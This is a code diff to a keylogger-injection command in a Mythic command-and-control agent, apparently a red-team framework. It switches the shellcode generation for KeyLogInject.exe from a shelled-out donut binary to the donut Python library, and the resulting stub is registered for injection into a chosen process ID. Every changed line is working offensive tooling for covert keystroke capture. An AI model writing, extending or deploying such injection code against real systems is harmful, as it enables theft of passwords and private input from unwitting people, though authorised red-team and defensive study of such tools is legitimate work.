@@ -10,6 +10,7 @@ from mythic_container.MythicRPC import *
 import base64
 import os
 import asyncio
+import donut
 
 KEYLOG_INJECT_PATH = "/srv/KeyLogInject.exe"
 
@@ -44,6 +45,7 @@ class KeylogInjectCommand(CommandBase):
     version = 2
     author = "@djhohnstein"
     argument_class = KeylogInjectArguments
+    browser_script = BrowserScript(script_name="keylog_inject", author="@its_a_feature_", for_new_ui=True)
     attackmapping = ["T1056"]
     supported_ui_features=["keylog_inject"]
 
@@ -78,30 +80,21 @@ class KeylogInjectCommand(CommandBase):
             TaskID=taskData.Task.ID,
             UpdateStatus=f"generating stub shellcode"
         ))
-        donutPath = os.path.abspath(self.agent_code_path / "donut")
-        if not path.exists(donutPath):
-            raise Exception("Could not find {}".format(donutPath))
-        command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
-        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
-        stdout, stderr = await proc.communicate()
-        
-        command = "{} -f 1 -p \"{}\" {}".format(donutPath, taskData.args.get_arg("pipe_name"), KEYLOG_INJECT_PATH)
-        # need to go through one more step to turn our exe into shellcode
-        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
-                                        stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
-        stdout, stderr = await proc.communicate()
-        if os.path.exists("/tmp/loader.bin"):
-            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
-                TaskID=taskData.Task.ID,
-                DeleteAfterFetch=True,
-                FileContents=open("/tmp/loader.bin", 'rb').read()
-            ))
-            if file_resp.Success:
-                taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
-            else:
-                raise Exception("Failed to register keylog assembly: " + file_resp.Error)
+
+        donutPic = donut.create(
+            file=KEYLOG_INJECT_PATH, params=taskData.args.get_arg("pipe_name")
+        )
+        file_resp = await SendMythicRPCFileCreate(
+            MythicRPCFileCreateMessage(
+                TaskID=taskData.Task.ID, FileContents=donutPic, DeleteAfterFetch=True
+            )
+        )
+        if file_resp.Success:
+            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
         else:
-            raise Exception("Failed to find loader.bin")
+            raise Exception(
+                "Failed to register keylog_inject stub binary: " + file_resp.Error
+            )
         response.DisplayParams = "-PID {}".format(taskData.args.get_arg("pid"))
         return response
 
